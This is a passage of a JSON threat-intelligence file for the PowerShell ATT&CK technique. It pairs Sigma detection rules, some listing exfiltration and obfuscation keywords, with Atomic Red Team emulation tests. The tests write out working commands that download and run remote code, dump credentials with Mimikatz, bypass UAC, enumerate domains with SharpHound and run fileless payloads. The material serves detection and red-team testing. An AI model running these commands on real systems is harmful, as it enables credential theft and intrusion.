                            "description": "Detects Obfuscated Powershell via VAR++ LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - '{0}'\n    - '{1}'\n    - '{2}'\n    - '{3}'\n    - '{4}'\n    - '{5}'\n    ServiceFileName|contains|all:\n    - '&&set'\n    - cmd\n    - /c\n    - -f\nfalsepositives:\n- Unknown\nid: 4c54ba8f-73d2-4d40-8890-d9cf1dca3d30\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 14bcba49-a428-42d9-b943-e2ce0f0f7ae6\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - Security\n",
                            "sigma:id": "4c54ba8f-73d2-4d40-8890-d9cf1dca3d30",
                            "title": "Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7d1aaf3d-4304-425c-b7c3-162055e0b3ab",
                        "lookup_data": {
                            "description": "Detects the use of various cli utility related to web request exfiltrating data",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/02\ndescription: Detects the use of various cli utility related to web request exfiltrating\n  data\ndetection:\n  condition: (selection_iwr or all of selection_curl*) and payloads\n  payloads:\n  - CommandLine|contains:\n    - ToBase64String\n    - whoami\n    - nltest\n    - ifconfig\n    - hostname\n    - net view\n    - qprocess\n    - netstat\n    - systeminfo\n    - tasklist\n    - sc query\n  - CommandLine|contains|all:\n    - 'type '\n    - ' > '\n    - ' C:\\'\n  selection_curl:\n    CommandLine|contains: --ur\n    Image|endswith: \\curl.exe\n  selection_curl_data:\n    CommandLine|contains:\n    - ' -d '\n    - ' --data '\n  selection_iwr:\n    CommandLine|contains:\n    - Invoke-WebRequest\n    - 'iwr '\n    - 'wget '\n    - 'curl '\n    CommandLine|contains|all:\n    - ' -ur'\n    - ' -me'\n    - ' -b'\n    - ' POST '\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\nfalsepositives:\n- Unlikely\nid: 7d1aaf3d-4304-425c-b7c3-162055e0b3ab\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Possible Exfiltration Of Data Via CLI\n",
                            "sigma:id": "7d1aaf3d-4304-425c-b7c3-162055e0b3ab",
                            "title": "Possible Exfiltration Of Data Via CLI",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b6b49cd1-34d6-4ead-b1bf-176e9edba9a4",
                        "lookup_data": {
                            "description": "Detects the presenece of reversed PowerShell commands in the CommandLine. This is often used as a method of obfuscation by attackers",
                            "raw": "author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton\ndate: 2020/10/11\ndescription: Detects the presenece of reversed PowerShell commands in the CommandLine.\n  This is often used as a method of obfuscation by attackers\ndetection:\n  condition: all of selection_* and not 1 of filter_*\n  filter_ansible:\n    CommandLine|contains|all:\n    - -EncodedCommand\n    - rahc\n    ParentImage: C:\\Windows\\System32\\cmd.exe\n  selection_cli:\n    CommandLine|contains:\n    - hctac\n    - kaerb\n    - dnammoc\n    - ekovn\n    - eliFd\n    - rahc\n    - etirw\n    - golon\n    - tninon\n    - eddih\n    - tpircS\n    - ssecorp\n    - llehsrewop\n    - esnopser\n    - daolnwod\n    - tneilCbeW\n    - tneilc\n    - ptth\n    - elifotevas\n    - 46esab\n    - htaPpmeTteG\n    - tcejbO\n    - maerts\n    - hcaerof\n    - retupmoc\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\nfalsepositives:\n- Unlikely\nid: b6b49cd1-34d6-4ead-b1bf-176e9edba9a4\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://2019.offzone.moscow/ru/report/hunting-for-powershell-abuses/\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=66\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Potential PowerShell Obfuscation Via Reversed Commands\n",
                            "sigma:id": "b6b49cd1-34d6-4ead-b1bf-176e9edba9a4",
                            "title": "Potential PowerShell Obfuscation Via Reversed Commands",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e8314f79-564d-4f79-bc13-fbc0bf2660d8",
                        "lookup_data": {
                            "description": "Detects specific techniques often seen used inside of PowerShell scripts to obfscuate Alias creation",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/09\ndescription: Detects specific techniques often seen used inside of PowerShell scripts\n  to obfscuate Alias creation\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - -Alias\n    - ' -Value (-join('\nfalsepositives:\n- Unknown\nid: e8314f79-564d-4f79-bc13-fbc0bf2660d8\nlevel: low\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- Internal Research\nrelated:\n- id: 96cd126d-f970-49c4-848a-da3a09f55c55\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1027\n- attack.t1059.001\ntitle: Potential PowerShell Obfuscation Using Character Join\n",
                            "sigma:id": "e8314f79-564d-4f79-bc13-fbc0bf2660d8",
                            "title": "Potential PowerShell Obfuscation Using Character Join",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7a922f1b-2635-4d6c-91ef-af228b198ad3",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via COMPRESS OBFUSCATION",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via COMPRESS OBFUSCATION\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - system.io.compression.deflatestream\n    - system.io.streamreader\n    ServiceFileName|contains|all:\n    - new-object\n    - text.encoding]::ascii\n    - readtoend\nfalsepositives:\n- Unknown\nid: 7a922f1b-2635-4d6c-91ef-af228b198ad3\nlevel: medium\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 175997c5-803c-4b08-8bb0-70b099f47595\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation COMPRESS OBFUSCATION - Security\n",
                            "sigma:id": "7a922f1b-2635-4d6c-91ef-af228b198ad3",
                            "title": "Invoke-Obfuscation COMPRESS OBFUSCATION - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a23791fe-8846-485a-b16b-ca691e1b03d4",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via RUNDLL LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via RUNDLL LAUNCHER\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|contains|all:\n    - rundll32.exe\n    - shell32.dll\n    - shellexec_rundll\n    - powershell\nfalsepositives:\n- Unknown\nid: a23791fe-8846-485a-b16b-ca691e1b03d4\nlevel: medium\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: e6cb92b4-b470-4eb8-8a9d-d63e8583aae0\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation RUNDLL LAUNCHER - PowerShell Module\n",
                            "sigma:id": "a23791fe-8846-485a-b16b-ca691e1b03d4",
                            "title": "Invoke-Obfuscation RUNDLL LAUNCHER - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "df9a0e0e-fedb-4d6c-8668-d765dfc92aa7",
                        "lookup_data": {
                            "description": "Detects suspicious use of the WSMAN provider without PowerShell.exe as the host application.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/06/24\ndescription: Detects suspicious use of the WSMAN provider without PowerShell.exe as\n  the host application.\ndetection:\n  condition: selection and not filter\n  filter:\n    HostApplication|contains: powershell\n  selection:\n    ProviderName: WSMan\nfalsepositives:\n- Unknown\nid: df9a0e0e-fedb-4d6c-8668-d765dfc92aa7\nlevel: medium\nlogsource:\n  definition: fields have to be extract from event\n  product: windows\n  service: powershell-classic\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/chadtilbury/status/1275851297770610688\n- https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/\n- https://github.com/bohops/WSMan-WinRM\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.lateral_movement\n- attack.t1021.003\ntitle: Suspicious Non PowerShell WSMAN COM Provider\n",
                            "sigma:id": "df9a0e0e-fedb-4d6c-8668-d765dfc92aa7",
                            "title": "Suspicious Non PowerShell WSMAN COM Provider",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                        "lookup_data": {
                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1674763285",
                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ac7102b4-9e1e-4802-9b4f-17c5524c015c",
                        "lookup_data": {
                            "description": "Detects execution of PowerShell via creation of named pipe starting with PSHost",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2019/09/12\ndescription: Detects execution of PowerShell via creation of named pipe starting with\n  PSHost\ndetection:\n  condition: selection\n  selection:\n    PipeName|startswith: \\PSHost\nfalsepositives:\n- Unknown\nid: ac7102b4-9e1e-4802-9b4f-17c5524c015c\nlevel: informational\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2022/08/04\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Execution Via Named Pipe\n",
                            "sigma:id": "ac7102b4-9e1e-4802-9b4f-17c5524c015c",
                            "title": "PowerShell Execution Via Named Pipe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "65531a81-a694-4e31-ae04-f8ba5bc33759",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell download command",
                            "raw": "author: Florian Roth\ndate: 2017/03/05\ndescription: Detects suspicious PowerShell download command\ndetection:\n  condition: downloadfile or downloadstring\n  downloadfile:\n    Message|contains|all:\n    - System.Net.WebClient\n    - .DownloadFile(\n  downloadstring:\n    Message|contains|all:\n    - System.Net.WebClient\n    - .DownloadString(\nfalsepositives:\n- PowerShell scripts that download content from the Internet\nid: 65531a81-a694-4e31-ae04-f8ba5bc33759\nlevel: medium\nlogsource:\n  product: windows\n  service: powershell\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.t1086\ntitle: Suspicious PowerShell Download\n",
                            "sigma:id": "65531a81-a694-4e31-ae04-f8ba5bc33759",
                            "title": "Suspicious PowerShell Download",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "60167e5c-84b2-4c95-a7ac-86281f27c445",
                        "lookup_data": {
                            "description": "Detects remote PowerShell sessions",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/08/10\ndescription: Detects remote PowerShell sessions\ndetection:\n  condition: selection\n  selection:\n    HostApplication|contains: wsmprovhost.exe\n    HostName: ServerRemoteHost\nfalsepositives:\n- Legitimate use remote PowerShell sessions\nid: 60167e5c-84b2-4c95-a7ac-86281f27c445\nlevel: high\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2022/06/20\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html\nrelated:\n- id: 96b9f619-aa91-478f-bacb-c3e50f8df575\n  type: derived\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.lateral_movement\n- attack.t1021.006\ntitle: Remote PowerShell Session (PS Classic)\n",
                            "sigma:id": "60167e5c-84b2-4c95-a7ac-86281f27c445",
                            "title": "Remote PowerShell Session (PS Classic)",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1059.001",
                "display_name": "Command and Scripting Interpreter: PowerShell",
                "atomic_tests": [
                    {
                        "name": "Mimikatz",
                        "auto_generated_guid": "f3132740-55bc-48c4-bcc0-758a459cd027",
                        "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "mimurl": {
                                "description": "Mimikatz url",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
                            }
                        },
                        "executor": {
                            "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Run BloodHound from local disk",
                        "auto_generated_guid": "a21bb23e-e677-4ee7-af90-6931b57b6350",
                        "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "SharpHound.ps1 must be located at \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\n"
                            }
                        ],
                        "executor": {
                            "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\ncatch { $_; exit $_.Exception.HResult}\nStart-Sleep 5\n",
                            "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Run Bloodhound from Memory using Download Cradle",
                        "auto_generated_guid": "bf8c1441-4674-4dab-8e4e-39d93d08f9b7",
                        "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n",
                            "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Mimikatz - Cradlecraft PsSendKeys",
                        "auto_generated_guid": "af1800cf-9f9d-4fd1-a709-14b1e6de020d",
                        "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Invoke-AppPathBypass",
                        "auto_generated_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
                        "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Powershell MsXml COM object - with prompt",
                        "auto_generated_guid": "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da",
                        "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "url": {
                                "description": "url of payload to execute",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1"
                            }
                        },
                        "executor": {
                            "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Powershell XML requests",
                        "auto_generated_guid": "4396927f-e503-427b-b023-31049b9b09a6",
                        "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "url": {
                                "description": "url of payload to execute",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml"
                            }
                        },
                        "executor": {
                            "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Powershell invoke mshta.exe download",
                        "auto_generated_guid": "8a2ad40b-12c7-4b25-8521-2737b0a415af",
                        "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "url": {
                                "description": "url of payload to execute",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct"
                            }
                        },
                        "executor": {
                            "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Powershell Invoke-DownloadCradle",
                        "auto_generated_guid": "cc50fa2a-a4be-42af-a88f-e347ba0bf4d7",
                        "description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nInvoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "steps": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n",
                            "name": "manual"
                        }
                    },
                    {
                        "name": "PowerShell Fileless Script Execution",
                        "auto_generated_guid": "fa050f5e-bc75-4230-af73-b6fd7852cd73",
                        "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
                            "cleanup_command": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "NTFS Alternate Data Stream Access",
                        "auto_generated_guid": "8e5c5532-1181-4c1d-bb79-b3a9f5dbd680",
                        "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ads_file": {
                                "description": "File created to store Alternate Stream Data",
                                "type": "string",
                                "default": "$env:TEMP\\NTFS_ADS.txt"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "Homedrive must be an NTFS drive\n",
                                "prereq_command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains \"NTFS\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Write-Host Prereq's for this test cannot be met automatically\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "command": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n",
                            "cleanup_command": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\n"
                        }
                    },
                    {
                        "name": "PowerShell Session Creation and Use",
                        "auto_generated_guid": "7c1acec2-78fa-4305-a3e0-db2a54cddecd",
                        "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "hostname_to_connect": {
                                "description": "The host to connect to, by default it will connect to the local machine",
                                "type": "string",
                                "default": "$env:COMPUTERNAME"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "PSRemoting must be enabled\n",
                                "prereq_command": "Try {\n    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n",
                                "get_prereq_command": "Enable-PSRemoting\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": true,
                            "command": "New-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n"
                        }
                    },
                    {
                        "name": "ATHPowerShellCommandLineParameter -Command parameter variations",
                        "auto_generated_guid": "686a9785-f99b-41d4-90df-66ed515f81d7",
                        "description": "Executes powershell.exe with variations of the -Command parameter",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "command_line_switch_type": {
                                "description": "The type of supported command-line switch to use",
                                "type": "string",
                                "default": "Hyphen"
                            },
                            "command_param_variation": {
                                "description": "The \"Command\" parameter variation to use",
                                "type": "string",
                                "default": "C"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments",
                        "auto_generated_guid": "1c0a870f-dc74-49cf-9afc-eccc45e58790",
                        "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "command_line_switch_type": {
                                "description": "The type of supported command-line switch to use",
                                "type": "string",
                                "default": "Hyphen"
                            },
                            "command_param_variation": {
                                "description": "The \"Command\" parameter variation to use",
                                "type": "string",
                                "default": "C"
                            },
                            "encoded_arguments_param_variation": {
                                "description": "The \"EncodedArguments\" parameter variation to use",
                                "type": "string",
                                "default": "EA"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations",
                        "auto_generated_guid": "86a43bad-12e3-4e85-b97c-4d5cf25b95c3",
                        "description": "Executes powershell.exe with variations of the -EncodedCommand parameter",
                        "supported_platforms": [
